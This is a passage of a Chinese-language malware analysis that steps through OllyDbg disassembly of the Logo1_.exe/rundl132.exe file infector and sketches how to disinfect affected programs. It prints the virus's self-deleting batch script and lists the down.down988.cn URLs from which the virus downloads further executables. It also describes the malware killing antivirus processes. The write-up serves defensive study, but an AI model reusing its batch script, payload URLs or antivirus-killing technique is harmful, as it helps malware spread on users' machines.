
```
004080B6    56                push    esi
004080B7    E8 08C3FFFF      call    004043C4                                  ; jmp 到 kernel32.ReadFile
004080BC    837D F8 00      cmp     dword ptr [ebp-8], 0
004080C0    74 12           je      short 004080D4
004080C2    8B15 90294100   mov     edx, dword ptr [412990]
004080C8    8B4D F8         mov     ecx, dword ptr [ebp-8]                     ; [EBP-8]=文件大小-E501 吗？
004080CB    8BC7            mov     eax, edi
004080CD    E8 26C8FFFF     call    004048F8                                  ；跟进就知道是将读到的内容写如文件，通过查看 hfile=64h 就
004080D2    ^ EB D1         jmp     short 004080A5
004080D4    8D45 CC         lea     eax, dword ptr [ebp-34]
004080D4    8D45 CC         lea     eax, dword ptr [ebp-34]
004080D7    50              push    eax
004080D8    8D45 D4         lea     eax, dword ptr [ebp-2C]
004080DB    50              push    eax
004080DC    8D45 DC         lea     eax, dword ptr [ebp-24]
004080DF    50              push    eax
004080E0    57              push    edi
004080E1    E8 06C3FFFF     call    004043EC                                  ; jmp 到 kernel32.SetFileTime
//将文件时间设置回来
004080E6    57              push    edi
004080E7    E8 50C1FFFF     call    0040423C                                  ; jmp 到 kernel32.CloseHandle
//关闭文件句柄
004080EC    C685 C6FEFFFF 0>mov     byte ptr [ebp-13A], 0
004080F3    8D85 C6FEFFFF   lea     eax, dword ptr [ebp-13A]
004080F9    50              push    eax
004080FA    68 04010000     push    104
004080FF    E8 40C2FFFF     call    00404344                                  ; jmp 到 kernel32.GetTempPathA
00408104    C685 C1FDFFFF 0>mov     byte ptr [ebp-23F], 0
0040810B    8D85 C1FDFFFF   lea     eax, dword ptr [ebp-23F]
00408111    50              push    eax
00408112    6A 00           push    0
00408114    8D95 50FDFFFF   lea     edx, dword ptr [ebp-2B0]
0040811A    B8 94834000     mov     eax, 00408394
0040811F    E8 9CCBFFFF     call    00404CC0
00408124    8B85 50FDFFFF   mov     eax, dword ptr [ebp-2B0]
0040812A    E8 D9B3FFFF     call    00403508
0040812F    50              push    eax
00408130    8D85 C6FEFFFF   lea     eax, dword ptr [ebp-13A]
00408136    50              push    eax
00408137    E8 00C2FFFF     call    0040433C                                  ; jmp 到 kernel32.GetTempFileNameA
0040813C    8D95 4CFDFFFF   lea     edx, dword ptr [ebp-2B4]
00408142    B8 A4834000     mov     eax, 004083A4                             ; ASCII "?狒"
00408147    E8 74CBFFFF     call    00404CC0
0040814C    8B85 4CFDFFFF   mov     eax, dword ptr [ebp-2B4]                  ; 原来是.bat
00408152    50              push    eax
00408153    8D85 48FDFFFF   lea     eax, dword ptr [ebp-2B8]
00408159    8D95 C1FDFFFF   lea     edx, dword ptr [ebp-23F]
0040815F    B9 05010000     mov     ecx, 105
00408164    E8 87B1FFFF     call    004032F0
00408169    8B85 48FDFFFF   mov     eax, dword ptr [ebp-2B8]
0040816F    8D4D E8         lea     ecx, dword ptr [ebp-18]
00408172    5A              pop     edx
00408173    E8 B4C7FFFF     call    0040492C                                  ; 连接字符
00408178    8B45 E8         mov     eax, dword ptr [ebp-18]
0040817B    E8 88B3FFFF     call    00403508
00408180    50              push    eax                                       ; "C:\DOCUME~1\huyuytyt\LOCALS~1\Temp\$$aBE.bat")
00408181    E8 F6C0FFFF     call    0040427C                                  ; jmp 到 kernel32.DeleteFileA
//先删掉，要不容易出错。
//下面开始写批处理了。。代码已经很长了就不贴了直接看内容
:try1
Del "C:\Documents and Settings\huyuytyt\桌面\病毒\MdnPacker.exe"
if exist "C:\Documents and Settings\huyuytyt\桌面\病毒\MdnPacker.exe" goto try1
ren "C:\Documents and Settings\huyuytyt\桌面\病毒\MdnPacker.exe.exe" "MdnPacker.exe"
if exist "C:\Documents and Settings\huyuytyt\桌面\病毒\MdnPacker.exe.exe" goto try2
"C:\Documents and Settings\huyuytyt\桌面\病毒\MdnPacker.exe"
:try2
del "C:\DOCUME~1\huyuytyt\LOCALS~1\Temp\$$a35.bat"
就是试图删掉自身，将生成的文件重新命名回来，接着运行，最后删除批处理本身
00408272    E8 81C6FFFF     call    004048F8                                  ; 将生成的内容写入批处理
00408277    57              push    edi
00408278    E8 BFBFFFFF     call    0040423C                                  ; jmp 到 kernel32.CloseHandle
。。。。。。。。。。。。。。
004082D9    50              push    eax
004082DA    6A 00           push    0
004082DC    6A 20           push    20
004082DE    6A FF           push    -1
004082E0    6A 00           push    0
004082E2    6A 00           push    0
004082E4    8B45 E8         mov     eax, dword ptr [ebp-18]
004082E7    E8 1CB2FFFF     call    00403508
004082EC    50              push    eax
004082ED    6A 00           push    0
004082EF    E8 78BFFFFF     call    0040426C                                  ; jmp 到 kernel32.CreateProcessA
//运行这个批处理
。。。。。。。。。。。
0040830E    E8 C1600000     call    0040E3D4
{
。。。。。。。。。。
  0040E41B    50              push    eax
  0040E41C    6A 00           push    0
  0040E41E    6A 00           push    0
  0040E420    6A 20           push    20
  0040E422    6A FF           push    -1
  0040E424    6A 00           push    0
  0040E426    6A 00           push    0
  0040E428    8B45 FC         mov     eax, dword ptr [ebp-4]
  0040E42B    E8 D850FFFF     call    00403508
  0040E430    50              push    eax
  0040E431    6A 00           push    0
  0040E433    E8 345EFFFF     call    0040426C                                  ; jmp 到 kernel32.CreateProcessA
//运行 Logo1\_.exe
}
```

到这里，这个病毒基本上就分析完了。。。现在我们知道了`Logo1\_.exe`跟`rundl132.exe`是同一个程序，他们都是被感染程序的前`E501`字节写入的。。

下面我给出自己的恢复被感染程序编写的思路：

1. 查找所有的`EXE`文件
2. 将文件指针移动到`E501h`处，读取文件大小-`E501`字节内容，写进文件"程序原来的名字+.exe"
3. 删除掉原来的程序
4. 将"程序原来的名字+.exe"重新命名为"程序原来的名字"

那这个`Logo1\_.exe`到底做了什么坏事呢？我们继续跟踪。。。

```
00408F4E    8B85 B4FEFFFF   mov     eax, dword ptr [ebp-14C]
00408F54    E8 AFA5FFFF     call    00403508
```

`[ebp-14C]` =

```
http://down.down988.cn/a1.exe
http://down.down988.cn/a2.exe
http://down.down988.cn/a3.exe
http://down.down988.cn/a4.exe
http://down.down988.cn/a5.exe
http://down.down988.cn/a6.exe
http://down.down988.cn/a7.exe
http://down.down988.cn/a8.exe
```

是不是很可疑？？？

继续跟着`OD`走，

```
00408FDF    E8 ACFBFFFF     call    00408B90                                  ; 还记得这个 call 吗？关闭常见杀毒软件进程的
```

创建了三个线程！

```
00408FF5    50              push    eax
00408FF6    6A 00           push    0
00408FF8    6A 00           push    0
00408FFA    68 9CEE4000     push    0040EE9C                                  ；线程 1
00408FFF    6A 00           push    0
00409001    6A 00           push    0
00409003    E8 6CB2FFFF     call    00404274                                  ; jmp 到 kernel32.CreateThread
00409008    C605 D5F14100 0>mov     byte ptr [41F1D5], 1
0040900F    A1 0C124100     mov     eax, dword ptr [41120C]
00409014    F640 1C 01      test    byte ptr [eax+1C], 1
00409018    74 27           je      short 00409041
0040901A    68 30750000     push    7530
0040901F    E8 E8B3FFFF     call    0040440C                                  ; jmp 到 kernel32.Sleep
00409024    C605 D5F14100 0>mov     byte ptr [41F1D5], 0
0040902B    8D45 F8         lea     eax, dword ptr [ebp-8]
0040902E    50              push    eax
0040902F    6A 00           push    0
00409031    6A 00           push    0
```
